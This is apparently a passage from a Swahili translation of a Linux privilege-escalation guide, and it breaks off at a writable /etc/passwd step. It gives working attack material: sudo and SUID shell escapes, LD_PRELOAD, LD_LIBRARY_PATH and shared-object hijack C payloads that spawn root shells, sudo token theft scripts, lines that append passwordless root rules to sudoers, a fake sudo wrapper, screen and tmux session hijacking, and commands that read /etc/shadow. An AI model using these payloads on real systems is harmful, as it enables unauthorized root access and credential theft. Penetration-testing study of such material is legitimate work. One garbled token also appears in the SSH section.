D-Bus hufanya kazi kwa mfano wa **kuruhusu/kukanusha**, ikisimamia ruhusa za ujumbe (mitelezo ya method, kutuma ishara, n.k.) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinaelekeza mwingiliano na bus, na zinaweza kuruhusu kuongeza hadhi kwa kumtumia vibaya mtu zile ruhusa.

Mfano wa sera kama hizi ulio katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa za mtumiaji root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera zisizo na mtumiaji au group maalum zinafanya kazi kwa wote, wakati sera za muktadha "default" zinatumika kwa wale wasiofunikwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila wakati enumerate the network na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Daima angalia network services zinazoendesha kwenye machine ambazo haukuweza kuingiliana nazo kabla ya kupata ufikiaji wake:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia kama unaweza sniff traffic. Ikiwa unaweza, huenda ukaweza kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodheshaji wa Kawaida

Angalia **nani** wewe ni, **ruhusa** gani ulizonazo, **watumiaji** walio kwenye mfumo, ni gani wanaoweza **kuingia** na ni gani wana **ruhusa za root**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na hitilafu inayowawezesha watumiaji wenye **UID > INT_MAX** kupandisha vibali. Maelezo zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia ikiwa wewe ni **mwanachama wa kundi fulani** ambalo linaweza kukupa vibali vya root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia ikiwa kuna kitu chochote cha kuvutia kiko ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa hukatai kusababisha kelele nyingi na binaries za `su` na `timeout` ziko kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) ukiwa na parameter ya `-a` pia inajaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa ugundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuwa na uwezo wa kuinua ruhusa kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji mwingine (root ikiwa inawezekana) na ambayo **haitapakiwa kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikwa kwenye $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye root directory au kwa kuitisha `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Agizo hili linamruhusu mtumiaji **set an environment variable** wakati anatekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **uliotokana na HTB machine Admirer**, ulikuwa **nyeti** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikitekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → shell ya root

Ikiwa sudoers inahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzishwa kwa Bash isiyo ya kuingiliana ili kuendesha msimbo wowote kama root unapoita amri iliyoruhusiwa.

- Kwa nini inafanya kazi: Kwa shells zisizo za kuingiliana, Bash hupima `$BASH_ENV` na kusoma (source) faili hiyo kabla ya kuendesha script lengwa. Kanuni nyingi za sudo zina ruhusa ya kuendesha script au wrapper ya shell. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako inasomwa kwa haki za root.

- Mahitaji:
- Kanuni ya sudo unayoweza kuitekeleza (lengo lolote linaloiita `/bin/bash` isiyo ya kuingiliana, au script yoyote ya bash).
- `BASH_ENV` kuwepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, tumia `env_reset`.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
- Zingatia sudo I/O logging na alerting wakati preserved env vars zinapotumika.

### Sudo execution bypassing paths

**Jump** kusoma faili nyingine au kutumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila njia ya amri

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza kuiexploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa **suid** binary **inaendesha amri nyingine bila kutaja njia yake (daima angalia kwa** _**strings**_ **yaliyomo kwenye binary ya SUID isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary yenye njia ya amri

Ikiwa **suid** binary **inaendesha amri nyingine kwa kutaja njia**, basi unaweza kujaribu **export a function** iliyopewa jina la amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapomuita suid binary, kazi hii itatekelezwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Variable ya mazingira **LD_PRELOAD** hutumiwa kubainisha moja au zaidi ya shared libraries (.so files) ambazo loader itazipakia kabla ya nyingine zote, ikiwa ni pamoja na standard C library (`libc.so`). Mchakato huu unajulikana kama preloading ya library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwa executables za **suid/sgid**, mfumo unaweka masharti kadhaa:

- Loader hupuuzia **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifani na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba zitakazopakiwa awali ni zile tu zilizopo katika standard paths ambazo pia ni suid/sgid.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kuendesha amri kwa `sudo` na output ya `sudo -l` inajumuisha taarifa **env_keep+=LD_PRELOAD**. Mipangilio hii inaruhusu variable ya mazingira **LD_PRELOAD** kudumu na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezwaji wa code yoyote na vyeo vilivyoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Mwishowe, **escalate privileges** kwa kuendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti **LD_LIBRARY_PATH** env variable kwa sababu anadhibiti njia ambapo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary iliyo na ruhusa za **SUID** na inayoonekana isiyo ya kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kuangaliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa kutumiwa.

Ili kuvitumia hili, ungeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, ikiwa imekompailiwa na kutekelezwa, unalenga kuinua ruhusa kwa kubadilisha vibali vya faili na kuendesha shell yenye ruhusa zilizoongezwa.

Kompaili faili ya C iliyotajwa hapo juu kuwa shared object (.so) ukitumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoathirika kunapaswa kusababisha exploit, na kuruhusu uwezekano wa system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa baada ya kupata SUID binary inayopakia library kutoka folder ambapo tunaweza kuandika, hebu tuunde library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kuwa maktaba uliyotengeneza inapaswa kuwa na function iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo mtiifuzi anaweza kuzitumia kuvuka vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni ile ile lakini kwa matukio ambapo unaweza **kuingiza hoja tu** katika amri.

Mradi huu hukusanya kazi halali za Unix binaries ambazo zinaweza kutumika vibaya kuvuka restricted shells, kuongeza au kuhifadhi vigezo vya juu, kuhamisha faili, kuzalisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Kutumia tena token za sudo

Katika matukio ambapo una **sudo access** lakini huna nywila, unaweza kupandisha ruhusa kwa **kusubiri utekelezaji wa amri ya sudo kisha kuiba token ya kikao**.

Mahitaji ya kupandisha ruhusa:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa chaguo-msingi huo ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza nywila)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (inawezekana kuipakia)

(Unaweza kwa muda kuwezesha `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuamsha token ya sudo katika kikao chako** (hautapata moja kwa moja root shell, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **imilikiwa na root na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Exploit ya tatu** (`exploit_v3.sh`) itaunda **sudoers file** inayofanya **sudo tokens** kuwa ya milele na kuruhusu watumiaji wote kutumia **sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhini za kuandika** kwenye saraka au kwenye faili yoyote iliyotengenezwa ndani ya saraka unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **kuunda token ya sudo kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika tena faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizomo ndani ya `/etc/sudoers.d` zinaweka ni nani anaweza kutumia `sudo` na jinsi inavyofanya kazi. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kikundi root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kupandisha ruhusa**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna mbadala kadhaa kwa binary ya `sudo` kama `doas` ya OpenBSD, kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **user kawaida huunganishwa kwenye machine na hutumia `sudo`** kuongeza privileges na umepata shell ndani ya user context, unaweza **kuunda executable mpya ya sudo** itakayotekeleza code yako kama root kisha amri ya user. Kisha, **badilisha $PATH** ya user context (kwa mfano kwa kuongeza path mpya katika .bash_profile) ili wakati user atakapotekeleza sudo, executable yako ya sudo itatekelezwa.

Tambua kwamba ikiwa user anatumia shell tofauti (si `bash`) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba ya Kushiriki

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **chanzo cha faili za usanidi zilizopakiwa**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hiyo ina maana kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi zinaonyesha folda nyingine ambapo **libraries** zitatafutwa. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii ina maana mfumo utaatafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote **mtumiaji ana ruhusa za kuandika** kwenye mojawapo ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili za usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kupandisha ruhusa.\
Angalia **jinsi ya kuchukua faida ya misconfiguration hii** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib hadi `/var/tmp/flag15/`, itaitumika na programu katika sehemu hii kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba ya uovu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities hutoa **sehemu ndogo ya ruhusa za root zinazopatikana kwa mchakato**. Hii kwa ufanisi inagawanya ruhusa za root kuwa **vitengo vidogo vinavyotofautiana**. Kila kimoja cha vitengo hivi kinaweza kuzawadiwa kwa mchakato kwa kujitegemea. Kwa njia hii seti kamili ya ruhusa inapunguzwa, kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za Directory

Katika directory, the **bit for "execute"** inaonyesha kwamba mtumiaji aliyeathirika anaweza "**cd**" ndani ya folda.\
Bit ya **"read"** inaonyesha mtumiaji anaweza **kuorodhesha** **faili**, na bit ya **"write"** inaonyesha mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha tabaka la pili la ruhusa za hiari, zikiwa na uwezo wa **kuzipindisha ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaongeza udhibiti juu ya upatikanaji wa faili au directory kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao sio wamiliki au sehemu ya kikundi. Kiwango hiki cha **undani kinahakikisha usimamizi wa upatikanaji uliosahihi zaidi**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" ruhusa za "read" na "write" juu ya faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Vikao wazi vya shell

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya vikao vya **shell** vya user mwingine (**root**).\
Katika **matoleo mapya** utaweza **connect** kwa screen sessions tu za **your own user**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo kwa **matoleo ya zamani ya tmux**. Sikuweza hijack session ya tmux (v2.1) iliyoundwa na root wakati nilikuwa mtumiaji asiye na ruhusa.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box kutoka HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vilivyotengenezwa kwenye mifumo inayotegemea Debian (Ubuntu, Kubuntu, etc) kati ya September 2006 na May 13th, 2008 vinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii hutokana na wakati wa kuunda ssh key mpya katika OS hizo, kwani **tu tofauti 32,768 zilikuwa zawezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaelezea kama uthibitishaji kwa nenosiri unaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaelezea kama uthibitishaji wa public key unaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Inapowezekana uthibitishaji kwa nenosiri, inaonyesha kama server inaruhusu kuingia kwa akaunti zenye nenosiri tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaelezea kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa kutumia private key pekee
- `forced-commands-only`: Root anaweza kuingia tu kwa kutumia private key na ikiwa chaguzi za commands zimetajwa
- `no` : hapana

### AuthorizedKeysFile

Inaelezea faili zinazoshikilia public keys ambazo zinaweza kutumika kwa uthibitishaji wa mtumiaji. Inaweza kujumuisha tokens kama `%h`, ambazo zitat替被 na saraka ya nyumbani. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Utekelezaji huo utaonyesha kwamba ukijaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizopo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye server yako. Hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko katika **initial host** yako.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` hivi:
```
Host example.com
ForwardAgent yes
```
Tambua kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anapovuka kwenda mashine tofauti, host hiyo itaweza kupata keys (ambayo ni tatizo la usalama).

The file `/etc/ssh_config` can **kubadilisha** hizi **chaguzi** na kuruhusu au kuzuia usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kuzuia** ssh-agent forwarding kwa kutumia ufunguo `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ikiwa utakuta kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia vibaya kupandisha ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zinazovutia

### Faili za profile

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts zinazoendeshwa wakati mtumiaji anapoanzisha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa skripti ya profile isiyokuwa ya kawaida itapatikana, unapaswa kuikagua kwa **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na nakala ya ziada. Kwa hivyo inashauriwa **kutafuta zote** na **kuangalia ikiwa unaweza kuzisoma** ili kuona **ikiwa kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili `/etc/passwd` (au faili sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza nywila kwa moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
